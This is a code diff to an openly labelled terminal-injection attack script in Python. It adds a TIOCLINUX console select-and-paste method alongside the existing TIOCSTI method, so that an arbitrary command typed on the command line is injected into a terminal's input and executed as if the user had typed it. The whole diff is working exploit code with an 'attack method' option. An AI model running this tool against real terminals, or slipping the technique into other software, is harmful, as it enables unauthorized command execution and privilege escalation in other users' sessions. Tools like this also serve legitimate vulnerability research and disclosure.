@@ -7,11 +7,14 @@
 import argparse
 import fcntl
 import os
+import struct
 import termios
 
 lambda: (yield from [])  # Python >= 3.3 is required
 
 early_io_error = object()
+
+methods = {}
 
 def push_fd(fd, s):
     assert isinstance(s[0], bytes)
@@ -37,18 +40,64 @@ def push(s):
     fd = os.open('/dev/tty', os.O_RDONLY)
     push_fd(fd, s)
 
+methods['TIOCSTI'] = push
+
+TIOCL_SETSEL = 2
+TIOCL_SELLINE = 2
+TIOCL_PASTESEL = 3
+TIOCL_GETMOUSEREPORTING = 7
+
+def paste_fd(fd, s):
+    assert isinstance(s[0], bytes)
+    arg = struct.pack('b', TIOCL_GETMOUSEREPORTING)
+    try:
+        fcntl.ioctl(fd, termios.TIOCLINUX, arg)
+    except IOError as exc:
+        exc.reason = early_io_error
+        raise
+    os.write(fd,
+         b'\033[H'  # move cursor to (1, 1)
+         b'\033[2J'  # clear screan
+    )
+    os.write(fd, s)
+    os.write(fd, b'\n')
+    arg = struct.pack('xbHHHHH', TIOCL_SETSEL, 1, 1, 1, 1, TIOCL_SELLINE)
+    fcntl.ioctl(fd, termios.TIOCLINUX, memoryview(arg)[1:])  # FIXME:
+    # TIOCLINUX/TIOCL_SETSEL has unusual alignment requirements,
+    # which cannot be easily guaranteed in Python environment.
+    # The above may not work on systems where unaligned access is not allowed.
+    arg = struct.pack('b', TIOCL_PASTESEL)
+    fcntl.ioctl(fd, termios.TIOCLINUX, arg)
+
+def paste(s):
+    for fd in range(0, 2):
+        try:
+            paste_fd(fd, s)
+        except IOError as exc:
+            if exc.reason is early_io_error:
+                continue
+            else:
+                raise
+        else:
+            return
+    paste_fd(2, s)
+
+methods['TIOCLINUX'] = paste
+
 def str_to_bytes(s):
     return memoryview(os.fsencode(s)).cast('c')
 
 def main():
     ap = argparse.ArgumentParser()
+    ap.add_argument('--method', choices=['TIOCSTI', 'TIOCLINUX'], default='TIOCSTI', help='attack method')
     ap.add_argument('command', metavar='COMMAND')
     ap.add_argument('args', metavar='ARG', nargs='*')
     options = ap.parse_args()
     cmdline = [options.command] + options.args + ['\n']
     cmdline = ' '.join(cmdline)
     cmdline = str_to_bytes(cmdline)
-    push(cmdline)
+    method = methods[options.method]
+    method(cmdline)
 
 if __name__ == '__main__':
     main()
